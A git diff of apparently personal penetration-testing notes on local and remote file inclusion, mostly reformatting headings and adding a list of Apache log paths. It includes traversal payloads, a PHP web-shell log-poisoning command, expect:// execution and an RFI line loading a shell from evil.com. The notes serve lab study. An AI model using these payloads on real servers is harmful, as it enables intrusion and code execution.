@@ -4,11 +4,11 @@ description: Notes about some basic File Insclusion attack
 
 # File Inclusion
 
-### Playground
+## Playground
 
 * [**THM: File Inclusion, Path Traversal**](https://tryhackme.com/r/room/filepathtraversal)
 
-### Dangerous Function Lead to File Inclusion
+## Dangerous Function
 
 | **Function**                 | **Read Content** | **Execute** | **Remote URL** |
 | ---------------------------- | :--------------: | :---------: | :------------: |
@@ -30,7 +30,7 @@ description: Notes about some basic File Insclusion attack
 | `Response.WriteFile()`       |         ✅        |      ❌      |        ❌       |
 | `include`                    |         ✅        |      ✅      |        ✅       |
 
-### Local File Inclusion (LFI)
+## Local File Inclusion (LFI)
 
 Local File Inclusion (LFI) is a type of vulnerability where an attacker can exploit a web application to include files that are already present on the server. By manipulating input parameters, such as URLs or form fields, the attacker can trick the application into loading files from the local file system, potentially accessing sensitive information or executing malicious code.
 
@@ -45,7 +45,7 @@ Local File Inclusion (LFI) is a type of vulnerability where an attacker can expl
 | `php://filter/read=convert.base64-encode/resource=config` | LFI with Base64 Filter  |
 | `../../../../etc/passwd%00`                               | LFI with Null byte      |
 
-#### Log Poisoning to RCE
+## Log Poisoning to RCE
 
 ```bash
 # Inject Access Log
@@ -55,19 +55,61 @@ curl -X "<?php echo passthru(\$_GET['cmd']);?>" http://target.com/
 http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id
 ```
 
-Access Log Location
+### Access Log Location
 
-Apache:
+**Apache:**
 
-* /var/log/apache/access.log
-* /var/log/apache2/access.log
-* /etc/httpd/logs/access\_log&#x20;
+{% code overflow="wrap" %}
+```
+/etc/httpd/logs/access.log
+/etc/httpd/logs/access_log
+/etc/httpd/logs/error.log
+/etc/httpd/logs/error_log
+/opt/lampp/logs/access_log
+/opt/lampp/logs/error_log
+/usr/local/apache/log
+/usr/local/apache/logs
+/usr/local/apache/logs/access.log
+/usr/local/apache/logs/access_log
+/usr/local/apache/logs/error.log
+/usr/local/apache/logs/error_log
+/usr/local/etc/httpd/logs/access_log
+/usr/local/etc/httpd/logs/error_log
+/usr/local/www/logs/thttpd_log
+/var/apache/logs/access_log
+/var/apache/logs/error_log
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/apache-ssl/access.log
+/var/log/apache-ssl/error.log
+/var/log/httpd/access_log
+/var/log/httpd/error_log
+/var/log/httpsd/ssl.access_log
+/var/log/httpsd/ssl_log
+/var/log/thttpd_log
+/var/www/log/access_log
+/var/www/log/error_log
+/var/www/logs/access.log
+/var/www/logs/access_log
+/var/www/logs/error.log
+/var/www/logs/error_log
+C:\apache\logs\access.log
+C:\apache\logs\error.log
+C:\Program Files\Apache Group\Apache\logs\access.log
+C:\Program Files\Apache Group\Apache\logs\error.log
+C:\program files\wamp\apache2\logs
+C:\wamp\apache2\logs
+C:\wamp\logs
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+```
+{% endcode %}
 
 Nginx:
 
 * /var/log/nginx/access.log
 
-#### LFI to RCE
+## LFI to RCE
 
 {% code overflow="wrap" %}
 ```bash
@@ -82,7 +124,7 @@ curl -s "http://target.com/index.php?page=expect://id"
 ```
 {% endcode %}
 
-### Remote File Inclusion (RFI)
+## Remote File Inclusion (RFI)
 
 In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow\_url\_include setting to be enabled.
 
@@ -93,7 +135,7 @@ http://target.com/index.php?page=http://evil.com/shell.php&cmd=id
 ```
 {% endcode %}
 
-### Automation
+## Automation
 
 {% code overflow="wrap" %}
 ```bash
@@ -108,9 +150,9 @@ curl http://target.com/index.php?view=../../../../../../../../../../../../../../
 ```
 {% endcode %}
 
-### Tools
+## Tools
 
-**LFImap**
+### **LFImap**
 
 ```bash
 # Install
@@ -129,7 +171,7 @@ python3 lfimap.py -U "http://10.10.70.223/playground.php?page=test" -x --lhost 1
 
 <figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh33OpuqB9v3evsJlqTqijUPEdY4TF0sKMWuXC1VhMBCh7OIKkk_OplXm29b0KOURlBvtN0Y2hsfCHcHciCxuvVZ0L1uK_3jS9v1Z4Xs5VFgkw2RbFs28oPYwlJOG3p-tAhNcDx8uT4-0v72jgAEMP1KCqs0PYtXVRpTV1P740O_x9XhIHMTPVkDrQoRtM/s1332/lfimap.png" alt=""><figcaption><p>LFImap</p></figcaption></figure>
 
-### WordLists
+## WordLists
 
 * https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
 * https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
